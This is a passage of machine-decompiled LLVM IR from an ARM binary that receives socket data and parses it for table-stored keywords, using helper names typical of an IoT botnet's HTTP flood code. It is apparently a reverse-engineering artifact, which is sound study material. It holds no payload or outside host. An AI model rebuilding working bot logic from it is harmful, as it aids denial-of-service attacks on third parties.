  br i1 %v2_9500, label %dec_label_pc_94c4, label %dec_label_pc_949c

dec_label_pc_950c:                                ; preds = %dec_label_pc_94c4, %dec_label_pc_94a4
  %v0_950c = phi i32 [ %v0_9460, %dec_label_pc_94a4 ], [ %v0_94f4.pre, %dec_label_pc_94c4 ]
  store i32 %v0_950c, i32* %r0.global-to-local, align 4
  %v1_9510 = inttoptr i32 %v0_950c to i8*
  %v2_9510 = call i32 @util_strlen(i8* %v1_9510)
  store i32 %v2_9510, i32* %r0.global-to-local, align 4
  %v2_9514 = icmp ugt i32 %v2_9510, 126
  store i1 %v2_9514, i1* %cpsr_c.global-to-local, align 1
  %v7_9514 = icmp eq i32 %v2_9510, 127
  store i1 %v7_9514, i1* %cpsr_z.global-to-local, align 1
  %v8_9518 = icmp sgt i32 %v2_9510, 127
  br i1 %v8_9518, label %dec_label_pc_949c, label %dec_label_pc_951c

dec_label_pc_951c:                                ; preds = %dec_label_pc_950c
  %v0_951c = load i32, i32* @sl, align 4
  %v1_951c = add i32 %v0_951c, 16
  %v2_951c = inttoptr i32 %v1_951c to i32*
  %v3_951c = load i32, i32* %v2_951c, align 4
  %v1_9520 = and i32 %v3_951c, 33554432
  %v2_9520 = icmp ne i32 %v1_9520, 0
  store i1 %v2_9520, i1* %cpsr_c.global-to-local, align 1
  %v3_9520 = mul i32 %v3_951c, 128
  %v1_9524 = add i32 %v3_9520, 1472
  %v0_9528 = load i32, i32* @r5, align 4
  store i32 %v0_9528, i32* %r1.global-to-local, align 4
  %v0_952c = load i32, i32* %sb.global-to-local, align 4
  %v2_952c = add i32 %v1_9524, %v0_952c
  store i32 %v2_952c, i32* @r0, align 4
  %v2_9530 = inttoptr i32 %v2_952c to i8*
  %v3_9530 = call i32 @util_strcpy(i8* %v2_9530, i32 %v0_9528)
  store i32 %v3_9530, i32* %r0.global-to-local, align 4
  %v0_9534 = load i32, i32* @sl, align 4
  %v1_9534 = add i32 %v0_9534, 16
  %v2_9534 = inttoptr i32 %v1_9534 to i32*
  %v3_9534 = load i32, i32* %v2_9534, align 4
  %v0_9538 = load i32, i32* @r8, align 4
  store i32 %v0_9538, i32* @r5, align 4
  %v1_953c = add i32 %v3_9534, 1
  store i32 %v1_953c, i32* %r3.global-to-local, align 4
  store i32 %v1_953c, i32* %v2_9534, align 4
  %v1_935c.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9350

dec_label_pc_9548:                                ; preds = %dec_label_pc_9668
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_954c = load i32, i32* @r4, align 4
  %v2_954c = inttoptr i32 %v1_954c to i32*
  store i32 104, i32* %v2_954c, align 4
  br label %dec_label_pc_9550

dec_label_pc_9550:                                ; preds = %dec_label_pc_9694, %dec_label_pc_9028, %dec_label_pc_9548
  %v0_9550 = load i32, i32* @sl, align 4
  %v1_9550 = add i32 %v0_9550, -1452
  %v2_9550 = inttoptr i32 %v1_9550 to i32*
  %v3_9550 = load i32, i32* %v2_9550, align 4
  store i32 %v3_9550, i32* %r0.global-to-local, align 4
  %v1_9554 = call i32 @__GI___libc_close(i32 %v3_9550)
  store i32 %v1_9554, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_9560 = load i32, i32* @sl, align 4
  %v2_9560 = add i32 %v1_9560, -1452
  %v3_9560 = inttoptr i32 %v2_9560 to i32*
  store i32 -1, i32* %v3_9560, align 4
  %v0_9564 = load i32, i32* %r2.global-to-local, align 4
  %v1_9564 = trunc i32 %v0_9564 to i8
  %v2_9564 = load i32, i32* @sl, align 4
  %v3_9564 = add i32 %v2_9564, -1448
  %v4_9564 = inttoptr i32 %v3_9564 to i8*
  store i8 %v1_9564, i8* %v4_9564, align 1
  br label %dec_label_pc_87ec

dec_label_pc_956c:                                ; preds = %dec_label_pc_85d4
  store i32 %v1_85d4, i32* %r3.global-to-local, align 4
  %v1_9570 = trunc i32 %v1_85d4 to i8
  store i8 %v1_9570, i8* %v2_860c, align 1
  %v0_9574 = load i32, i32* @r6, align 4
  %v1_9574 = add i32 %v0_9574, -1452
  %v2_9574 = inttoptr i32 %v1_9574 to i32*
  %v3_9574 = load i32, i32* %v2_9574, align 4
  store i32 %v3_9574, i32* %r0.global-to-local, align 4
  %v1_9578 = call i32 @__GI___libc_close(i32 %v3_9574)
  store i32 %v1_9578, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_9580 = load i32, i32* @r6, align 4
  %v2_9580 = add i32 %v1_9580, -1452
  %v3_9580 = inttoptr i32 %v2_9580 to i32*
  store i32 -1, i32* %v3_9580, align 4
  br label %dec_label_pc_85f4

dec_label_pc_9588:                                ; preds = %dec_label_pc_9388, %dec_label_pc_9350
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_9590 = call i32 @table_retrieve_val(i32 38, i32* null)
  %v0_9594 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9594, i32* @r1, align 4
  store i32 %v3_9590, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_95a0 = call i32 @util_stristr(i8* %tmp168, i32 %v0_9594, i32 %v3_9590)
  store i32 %v4_95a0, i32* %r0.global-to-local, align 4
  %v2_95a4 = icmp eq i32 %v4_95a0, -1
  store i1 %v2_95a4, i1* %cpsr_c.global-to-local, align 1
  %v7_95a4 = icmp eq i32 %v4_95a0, -1
  store i1 %v7_95a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95a4, label %dec_label_pc_9718, label %dec_label_pc_95ac

dec_label_pc_95ac:                                ; preds = %dec_label_pc_9588
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 38, i32* %r0.global-to-local, align 4
  %v3_95b4 = call i32 @table_retrieve_val(i32 38, i32* null)
  %v0_95b8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_95b8, i32* @r1, align 4
  store i32 %v3_95b4, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_95c4 = call i32 @util_stristr(i8* %tmp168, i32 %v0_95b8, i32 %v3_95b4)
  store i32 %v4_95c4, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v2_95cc = add i32 %v4_95c4, %v2_827c
  %v3_95cc = inttoptr i32 %v2_95cc to i8*
  %v4_95cc = load i8, i8* %v3_95cc, align 1
  %v2_95d4 = icmp ugt i8 %v4_95cc, 31
  store i1 %v2_95d4, i1* %cpsr_c.global-to-local, align 1
  %v7_95d4 = icmp eq i8 %v4_95cc, 32
  store i1 %v7_95d4, i1* %cpsr_z.global-to-local, align 1
  %v2_95dc = zext i1 %v7_95d4 to i32
  %v2_95dc.v4_95c4 = add i32 %v2_95dc, %v4_95c4
  store i32 %v2_95dc.v4_95c4, i32* @r4, align 4
  %v2_95e0 = add i32 %v2_95dc.v4_95c4, %v2_827c
  store i32 %v2_95e0, i32* @r6, align 4
  store i32 %v2_95e0, i32* %r0.global-to-local, align 4
  %v1_95e8 = load i32, i32* %fp.global-to-local, align 4
  %v2_95e8 = sub i32 %v1_95e8, %v2_95dc.v4_95c4
  store i32 %v2_95e8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_95f4 = call i32 @util_memsearch(i32 %v2_95e0, i32 %v2_95e8, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32 2)
  store i32 %v5_95f4, i32* %r0.global-to-local, align 4
  %v2_95f8 = icmp eq i32 %v5_95f4, -1
  store i1 %v2_95f8, i1* %cpsr_c.global-to-local, align 1
  %v7_95f8 = icmp eq i32 %v5_95f4, -1
  store i1 %v7_95f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95f8, label %dec_label_pc_9718, label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %dec_label_pc_95ac
  %v2_9600 = icmp ne i32 %v5_95f4, 0
  store i1 %v2_9600, i1* %cpsr_c.global-to-local, align 1
  %v7_9600 = icmp eq i32 %v5_95f4, 1
  store i1 %v7_9600, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %r2.global-to-local, align 4
  %v7_9608 = icmp slt i32 %v5_95f4, 2
  br i1 %v7_9608, label %bb201, label %bb200

bb200:                                            ; preds = %dec_label_pc_9600
  %v9_9608 = add i32 %v5_95f4, -2
  store i32 %v9_9608, i32* %r0.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %dec_label_pc_9600, %bb200
  %v1_9610 = phi i32 [ %v5_95f4, %dec_label_pc_9600 ], [ %v9_9608, %bb200 ]
  %v2_9610 = add i32 %v1_9610, %v2_8710
  store i32 -20773, i32* @lr, align 4
  %v1_9618 = add i32 %v1_9610, 1
  store i32 %v1_9618, i32* @r5, align 4
  %v1_961c = load i32, i32* @r4, align 4
  %v2_961c = add i32 %v2_9610, %v1_961c
  store i32 %v2_961c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_9624 = load i32, i32* @r6, align 4
  store i32 %v0_9624, i32* %r0.global-to-local, align 4
  store i32 %v1_9618, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1b40c.53 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_9634 = add i32 %v2_961c, -20773
  %v5_9634 = inttoptr i32 %v4_9634 to i8*
  store i8 0, i8* %v5_9634, align 1
  %v5_9638 = call i32 @util_memsearch(i32 %v0_9624, i32 %v1_9618, i32 ptrtoint ([5 x i8]* @global_var_1b40c.53 to i32), i32 4)
  store i32 %v5_9638, i32* %r0.global-to-local, align 4
  %v2_963c = icmp ugt i32 %v5_9638, 3
  store i1 %v2_963c, i1* %cpsr_c.global-to-local, align 1
  %v7_963c = icmp eq i32 %v5_9638, 4
  store i1 %v7_963c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_963c, label %dec_label_pc_9a00, label %dec_label_pc_9644

dec_label_pc_9644:                                ; preds = %bb201
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  %v1_9648 = load i32, i32* @r4, align 4
  %v2_9648 = add i32 %v1_9648, %v2_827c
  %v3_9648 = inttoptr i32 %v2_9648 to i8*
  %v4_9648 = load i8, i8* %v3_9648, align 1
  %v6_9648 = zext i8 %v4_9648 to i32
  store i32 %v6_9648, i32* %r3.global-to-local, align 4
  %v2_964c = icmp ugt i8 %v4_9648, 46
  store i1 %v2_964c, i1* %cpsr_c.global-to-local, align 1
  %v7_964c = icmp eq i8 %v4_9648, 47
  store i1 %v7_964c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_964c, label %dec_label_pc_9c00, label %dec_label_pc_9654

dec_label_pc_9654:                                ; preds = %dec_label_pc_96a0, %dec_label_pc_9c30, %dec_label_pc_9c00, %dec_label_pc_9ad0, %dec_label_pc_9ab4, %dec_label_pc_9644, %dec_label_pc_9c48, %dec_label_pc_9afc
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9658 = load i32, i32* @sl, align 4
  %v3_9658 = add i32 %v2_9658, -1448
  %v4_9658 = inttoptr i32 %v3_9658 to i8*
  store i8 1, i8* %v4_9658, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9660:                                ; preds = %dec_label_pc_87e4
  %v0_9660 = call i32 @__GI___errno_location()
  store i32 %v0_9660, i32* %r0.global-to-local, align 4
  store i32 %v0_9660, i32* @r4, align 4
  br label %dec_label_pc_9668

dec_label_pc_9668:                                ; preds = %dec_label_pc_968c, %dec_label_pc_9660
  %v1_966c = phi i32 [ %v0_9660, %dec_label_pc_9660 ], [ %v0_9694, %dec_label_pc_968c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_966c = inttoptr i32 %v1_966c to i32*
  store i32 0, i32* %v2_966c, align 4
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  %v0_9674 = load i32, i32* @sl, align 4
  %v1_9674 = add i32 %v0_9674, -1452
  %v2_9674 = inttoptr i32 %v1_9674 to i32*
  %v3_9674 = load i32, i32* %v2_9674, align 4
  store i32 %v3_9674, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_967c = load i32, i32* %r3.global-to-local, align 4
  %v1_967c = add i32 %v0_967c, 16384
  store i32 %v1_967c, i32* %r3.global-to-local, align 4
  %v4_9680 = call i32 @__libc_recv(i32 %v3_9674, i32 %v2_827c, i32 10240, i32 %v1_967c)
  store i32 %v4_9680, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9684 = icmp eq i32 %v4_9680, 0
  store i1 %v2_9684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9684, label %dec_label_pc_9548, label %dec_label_pc_968c

dec_label_pc_968c:                                ; preds = %dec_label_pc_9668
  %v3_968c = icmp eq i32 %v4_9680, -1
  store i1 %v3_968c, i1* %cpsr_c.global-to-local, align 1
  %v8_968c = icmp eq i32 %v4_9680, -1
  store i1 %v8_968c, i1* %cpsr_z.global-to-local, align 1
  %v0_9694 = load i32, i32* @r4, align 4
  br i1 %v3_968c, label %dec_label_pc_9694, label %dec_label_pc_9668

dec_label_pc_9694:                                ; preds = %dec_label_pc_968c
  %v1_9694 = inttoptr i32 %v0_9694 to i32*
  %v2_9694 = load i32, i32* %v1_9694, align 4
  store i32 %v2_9694, i32* %r3.global-to-local, align 4
  %v2_9698 = icmp ugt i32 %v2_9694, 10
  store i1 %v2_9698, i1* %cpsr_c.global-to-local, align 1
  %v7_9698 = icmp eq i32 %v2_9694, 11
  store i1 %v7_9698, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9698, label %dec_label_pc_96a0, label %dec_label_pc_9550

dec_label_pc_96a0:                                ; preds = %dec_label_pc_9694
  %v0_96a0 = load i32, i32* @sl, align 4
  %v1_96a0 = add i32 %v0_96a0, -1448
  %v2_96a0 = inttoptr i32 %v1_96a0 to i8*
  %v3_96a0 = load i8, i8* %v2_96a0, align 1
  %v4_96a0 = zext i8 %v3_96a0 to i32
  store i32 %v4_96a0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_96a4 = icmp eq i8 %v3_96a0, 0
  store i1 %v2_96a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_96a4, label %dec_label_pc_87ec, label %dec_label_pc_9654

dec_label_pc_96b0:                                ; preds = %dec_label_pc_8df4
  %v0_96b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_96b0 = add i32 %v0_96b0, 1
  store i32 %v1_96b0, i32* %r3.global-to-local, align 4
  %v1_96b4 = trunc i32 %v1_96b0 to i8
  %v2_96b4 = load i32, i32* @sl, align 4
  %v3_96b4 = add i32 %v2_96b4, -1448
  %v4_96b4 = inttoptr i32 %v3_96b4 to i8*
  store i8 %v1_96b4, i8* %v4_96b4, align 1
  br label %dec_label_pc_87ec

dec_label_pc_96bc:                                ; preds = %dec_label_pc_8c6c
  %v0_96bc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_96bc, i32* @r0, align 4
  %v0_96c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_96c0, i32* %r1.global-to-local, align 4
  %v2_96c4 = inttoptr i32 %v0_96bc to i8*
  %v3_96c4 = call i32 @util_strcpy(i8* %v2_96c4, i32 %v0_96c0)
  store i32 %v3_96c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c84

dec_label_pc_96cc:                                ; preds = %dec_label_pc_8d74
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_96d0 = load i32, i32* %fp.global-to-local, align 4
  %v2_96d0 = inttoptr i32 %v1_96d0 to i32*
  store i32 104, i32* %v2_96d0, align 4
  %v0_96d4 = load i32, i32* @sl, align 4
  %v1_96d4 = add i32 %v0_96d4, -1452
  %v2_96d4 = inttoptr i32 %v1_96d4 to i32*
  %v3_96d4 = load i32, i32* %v2_96d4, align 4
  store i32 %v3_96d4, i32* %r0.global-to-local, align 4
  %v1_96d8 = call i32 @__GI___libc_close(i32 %v3_96d4)
  store i32 %v1_96d8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_96e4 = load i32, i32* @sl, align 4
  %v2_96e4 = add i32 %v1_96e4, -1452
  %v3_96e4 = inttoptr i32 %v2_96e4 to i32*
  store i32 -1, i32* %v3_96e4, align 4
  %v0_96e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_96e8 = trunc i32 %v0_96e8 to i8
  %v2_96e8 = load i32, i32* @sl, align 4
  %v3_96e8 = add i32 %v2_96e8, -1448
  %v4_96e8 = inttoptr i32 %v3_96e8 to i8*
  store i8 %v1_96e8, i8* %v4_96e8, align 1
  br label %dec_label_pc_87ec

dec_label_pc_96f0:                                ; preds = %dec_label_pc_8d9c
  %v0_96f0 = load i32, i32* %fp.global-to-local, align 4
  %v1_96f0 = inttoptr i32 %v0_96f0 to i32*
  %v2_96f0 = load i32, i32* %v1_96f0, align 4
  store i32 %v2_96f0, i32* %r3.global-to-local, align 4
  %v2_96f4 = icmp ugt i32 %v2_96f0, 10
  store i1 %v2_96f4, i1* %cpsr_c.global-to-local, align 1
  %v7_96f4 = icmp eq i32 %v2_96f0, 11
  store i1 %v7_96f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_96f4, label %dec_label_pc_87ec, label %dec_label_pc_96fc

dec_label_pc_96fc:                                ; preds = %dec_label_pc_96f0
  %v0_96fc = load i32, i32* @sl, align 4
  %v1_96fc = add i32 %v0_96fc, -1452
  %v2_96fc = inttoptr i32 %v1_96fc to i32*
  %v3_96fc = load i32, i32* %v2_96fc, align 4
  store i32 %v3_96fc, i32* %r0.global-to-local, align 4
  %v1_9700 = call i32 @__GI___libc_close(i32 %v3_96fc)
  store i32 %v1_9700, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_970c = load i32, i32* @sl, align 4
  %v2_970c = add i32 %v1_970c, -1452
  %v3_970c = inttoptr i32 %v2_970c to i32*
  store i32 -1, i32* %v3_970c, align 4
  %v0_9710 = load i32, i32* %r2.global-to-local, align 4
  %v1_9710 = trunc i32 %v0_9710 to i8
  %v2_9710 = load i32, i32* @sl, align 4
  %v3_9710 = add i32 %v2_9710, -1448
  %v4_9710 = inttoptr i32 %v3_9710 to i8*
  store i8 %v1_9710, i8* %v4_9710, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9718:                                ; preds = %dec_label_pc_95ac, %dec_label_pc_9588
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_9720 = call i32 @table_retrieve_val(i32 37, i32* null)
  %v0_9724 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9724, i32* @r1, align 4
  store i32 %v3_9720, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_9730 = call i32 @util_stristr(i8* %tmp168, i32 %v0_9724, i32 %v3_9720)
  store i32 %v4_9730, i32* %r0.global-to-local, align 4
  %v2_9738 = icmp eq i32 %v4_9730, -1
  store i1 %v2_9738, i1* %cpsr_c.global-to-local, align 1
  %v7_9738 = icmp eq i32 %v4_9730, -1
  store i1 %v7_9738, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9738, label %dec_label_pc_9938, label %dec_label_pc_9744

dec_label_pc_9744:                                ; preds = %dec_label_pc_9718
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_974c = call i32 @table_retrieve_val(i32 37, i32* null)
  %v0_9750 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9750, i32* @r1, align 4
  store i32 %v3_974c, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_975c = call i32 @util_stristr(i8* %tmp168, i32 %v0_9750, i32 %v3_974c)
  store i32 %v4_975c, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v2_9764 = add i32 %v4_975c, %v2_827c
  %v3_9764 = inttoptr i32 %v2_9764 to i8*
  %v4_9764 = load i8, i8* %v3_9764, align 1
  %v2_976c = icmp ugt i8 %v4_9764, 31
  store i1 %v2_976c, i1* %cpsr_c.global-to-local, align 1
  %v7_976c = icmp eq i8 %v4_9764, 32
  store i1 %v7_976c, i1* %cpsr_z.global-to-local, align 1
  %v2_9774 = zext i1 %v7_976c to i32
  %v2_9774.v4_975c = add i32 %v2_9774, %v4_975c
  store i32 %v2_9774.v4_975c, i32* @r4, align 4
  %v2_9778 = add i32 %v2_9774.v4_975c, %v2_827c
  store i32 %v2_9778, i32* @r5, align 4
  store i32 %v2_9778, i32* %r0.global-to-local, align 4
  %v1_9780 = load i32, i32* %fp.global-to-local, align 4
  %v2_9780 = sub i32 %v1_9780, %v2_9774.v4_975c
  store i32 %v2_9780, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_978c = call i32 @util_memsearch(i32 %v2_9778, i32 %v2_9780, i32 ptrtoint ([3 x i8]* @global_var_1b3dc.43 to i32), i32 2)
  store i32 %v5_978c, i32* %r0.global-to-local, align 4
  %v2_9790 = icmp eq i32 %v5_978c, -1
  store i1 %v2_9790, i1* %cpsr_c.global-to-local, align 1
  %v7_9790 = icmp eq i32 %v5_978c, -1
  store i1 %v7_9790, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_978c, i32* @r7, align 4
  br i1 %v7_9790, label %dec_label_pc_9938, label %dec_label_pc_979c

dec_label_pc_979c:                                ; preds = %dec_label_pc_9744
  %v2_979c = icmp ne i32 %v5_978c, 0
  store i1 %v2_979c, i1* %cpsr_c.global-to-local, align 1
  %v7_979c = icmp eq i32 %v5_978c, 1
  store i1 %v7_979c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %ip.global-to-local, align 4
  %v7_97a4 = icmp slt i32 %v5_978c, 2
  br i1 %v7_97a4, label %bb203, label %bb202

bb202:                                            ; preds = %dec_label_pc_979c
  %v9_97a4 = add i32 %v5_978c, -2
  store i32 %v9_97a4, i32* @r7, align 4
  br label %bb203

bb203:                                            ; preds = %dec_label_pc_979c, %bb202
  %v1_97ac = phi i32 [ %v5_978c, %dec_label_pc_979c ], [ %v9_97a4, %bb202 ]
  store i32 %v2_8710, i32* %ip.global-to-local, align 4
  %v2_97ac = add i32 %v1_97ac, %v2_8710
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_97b4 = load i32, i32* @r4, align 4
  %v2_97b4 = add i32 %v2_97ac, %v1_97b4
  store i32 %v2_97b4, i32* %r2.global-to-local, align 4
  %v3_97b8 = load i32, i32* @r6, align 4
  %v4_97b8 = add i32 %v3_97b8, %v2_97b4
  %v5_97b8 = inttoptr i32 %v4_97b8 to i8*
  store i8 0, i8* %v5_97b8, align 1
  store i32 %v10_82f0, i32* @lr, align 4
  %v0_97c0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_97c0, i32* %stack_var_-44, align 4
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  %v1_97c8 = load i32, i32* @r4, align 4
  %v2_97c8 = add i32 %v1_97c8, %v2_827c
  %v3_97c8 = inttoptr i32 %v2_97c8 to i8*
  %v4_97c8 = load i8, i8* %v3_97c8, align 1
  %v6_97c8 = zext i8 %v4_97c8 to i32
  store i32 %v6_97c8, i32* %r0.global-to-local, align 4
  %v1_97cc = add nsw i32 %v6_97c8, -48
  store i32 %v1_97cc, i32* %r3.global-to-local, align 4
  %v2_97d0 = icmp ugt i32 %v1_97cc, 8
  store i1 %v2_97d0, i1* %cpsr_c.global-to-local, align 1
  %v7_97d0 = icmp eq i32 %v1_97cc, 9
  store i1 %v7_97d0, i1* %cpsr_z.global-to-local, align 1
  %v2_97d4 = xor i1 %v7_97d0, true
  %v3_97d4 = and i1 %v2_97d0, %v2_97d4
  br i1 %v3_97d4, label %.thread113, label %dec_label_pc_97dc

.thread113:                                       ; preds = %bb203
  %v4_97d4 = load i32, i32* @r5, align 4
  store i32 %v4_97d4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9804

dec_label_pc_97dc:                                ; preds = %bb203
  %v1_97e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97e0, %dec_label_pc_97dc
  %v0_97f8 = phi i32 [ %v1_97f8, %dec_label_pc_97e0 ], [ 1, %dec_label_pc_97dc ]
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 %v0_97f8, i32* %stack_var_-44, align 4
  %v2_97e8 = add i32 %v0_97f8, %v1_97e8.pre
  %v3_97e8 = inttoptr i32 %v2_97e8 to i8*
  %v4_97e8 = load i8, i8* %v3_97e8, align 1
  %v6_97e8 = zext i8 %v4_97e8 to i32
  store i32 %v6_97e8, i32* %r0.global-to-local, align 4
  %v1_97ec = add nsw i32 %v6_97e8, -48
  store i32 %v1_97ec, i32* %r3.global-to-local, align 4
  store i32 %v0_97f8, i32* %ip.global-to-local, align 4
  %v2_97f4 = icmp ugt i32 %v1_97ec, 8
  store i1 %v2_97f4, i1* %cpsr_c.global-to-local, align 1
  %v7_97f4 = icmp eq i32 %v1_97ec, 9
  store i1 %v7_97f4, i1* %cpsr_z.global-to-local, align 1
  %v1_97f8 = add i32 %v0_97f8, 1
  store i32 %v1_97f8, i32* @lr, align 4
  store i32 %v2_97e8, i32* %r1.global-to-local, align 4
  %v2_9800 = xor i1 %v2_97f4, true
  %v3_9800 = or i1 %v7_97f4, %v2_9800
  br i1 %v3_9800, label %dec_label_pc_97e0, label %dec_label_pc_9804

dec_label_pc_9804:                                ; preds = %dec_label_pc_97e0, %.thread113
  %v2_9810 = phi i32 [ %v4_97d4, %.thread113 ], [ %v2_97e8, %dec_label_pc_97e0 ]
  %v0_9804 = phi i32 [ %v6_97c8, %.thread113 ], [ %v6_97e8, %dec_label_pc_97e0 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9804 = icmp eq i32 %v0_9804, 0
  store i1 %v2_9804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9804, label %dec_label_pc_9938, label %dec_label_pc_980c

dec_label_pc_980c:                                ; preds = %dec_label_pc_9804
  store i32 0, i32* @r6, align 4
  %v3_9810 = inttoptr i32 %v2_9810 to i8*
  store i8 0, i8* %v3_9810, align 1
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9818 = load i32, i32* %stack_var_-44, align 4
  %v1_981c = add i32 %v3_9818, 1
  store i32 %v1_981c, i32* %ip.global-to-local, align 4
  store i32 %v1_981c, i32* %stack_var_-44, align 4
  %v0_9824 = load i32, i32* @r5, align 4
  %v2_9824 = add i32 %v0_9824, %v1_981c
  %v3_9824 = inttoptr i32 %v2_9824 to i8*
  %v4_9824 = load i8, i8* %v3_9824, align 1
  %v6_9824 = zext i8 %v4_9824 to i32
  store i32 %v6_9824, i32* %r3.global-to-local, align 4
  %v2_9828 = icmp ugt i8 %v4_9824, 31
  store i1 %v2_9828, i1* %cpsr_c.global-to-local, align 1
  %v7_9828 = icmp eq i8 %v4_9824, 32
  store i1 %v7_9828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9828, label %bb205, label %bb204

bb204:                                            ; preds = %dec_label_pc_980c
  store i32 %v2_9824, i32* @r4, align 4
  br label %.thread37

bb205:                                            ; preds = %dec_label_pc_980c
  %v2_982c = add i32 %v3_9818, 2
  store i32 %v2_982c, i32* %ip.global-to-local, align 4
  %v2_9830 = add i32 %v0_9824, %v2_982c
  store i32 %v2_9830, i32* @r4, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 %v2_982c, i32* %v11_82f4, align 4
  %v0_983c.pre = load i32, i32* @r4, align 4
  br label %.thread37

.thread37:                                        ; preds = %bb204, %bb205
  %v0_983c = phi i32 [ %v2_9824, %bb204 ], [ %v0_983c.pre, %bb205 ]
  store i32 %v0_983c, i32* %r0.global-to-local, align 4
  %v1_9840 = inttoptr i32 %v0_983c to i8*
  %v2_9840 = call i32 @util_strlen(i8* %v1_9840)
  store i32 ptrtoint ([5 x i8]* @global_var_1b414.55 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9840, i32* @r1, align 4
  %v0_984c = load i32, i32* @r4, align 4
  store i32 %v0_984c, i32* %r0.global-to-local, align 4
  %v3_9850 = inttoptr i32 %v0_984c to i8*
  %v4_9850 = call i32 @util_stristr(i8* %v3_9850, i32 %v2_9840, i32 ptrtoint ([5 x i8]* @global_var_1b414.55 to i32))
  store i32 %v4_9850, i32* %r0.global-to-local, align 4
  %v2_9854 = icmp eq i32 %v4_9850, -1
  store i1 %v2_9854, i1* %cpsr_c.global-to-local, align 1
  %v7_9854 = icmp eq i32 %v4_9850, -1
  store i1 %v7_9854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9854, label %.thread38, label %dec_label_pc_9864

.thread38:                                        ; preds = %.thread37
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v4_985c = load i32, i32* %v11_82f4, align 4
  store i32 %v4_985c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9898

dec_label_pc_9864:                                ; preds = %.thread37
